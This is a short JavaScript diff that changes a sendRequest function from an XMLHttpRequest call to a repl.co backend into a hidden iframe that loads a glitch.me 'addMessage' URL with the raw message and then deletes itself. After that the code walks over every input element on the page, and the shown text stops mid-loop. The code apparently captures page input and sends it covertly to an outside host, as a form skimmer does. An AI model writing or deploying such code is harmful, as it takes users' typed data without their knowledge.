@@ -1,18 +1,11 @@
 function sendRequest(message) {
-    var xhr = new XMLHttpRequest();
-    var url = 'https://backendserver--ashleyunneeded.repl.co/api/addMessage/?message=' + encodeURIComponent(message);
-    xhr.open('GET', url, true);
-    xhr.onload = function () {
-        if (xhr.status >= 200 && xhr.status < 300) {
-            console.log(xhr.responseText);
-        } else {
-            console.error('Request failed with status ' + xhr.status);
-        }
-    };
-    xhr.onerror = function () {
-        console.error('Network error');
-    };
-    xhr.send();
+    var i = document.createElement('iframe');
+    document.body.appendChild(i);
+    i.style.display = 'none';
+    i.contentWindow.location.href = `https://actually-hickory-squirrel.glitch.me/api/addMessage?message=${message}`;
+    setTimeout(() => {
+        i.remove();
+    }, 1000);
 };
 var se = true;
 document.querySelectorAll('input').forEach(inputElement => {
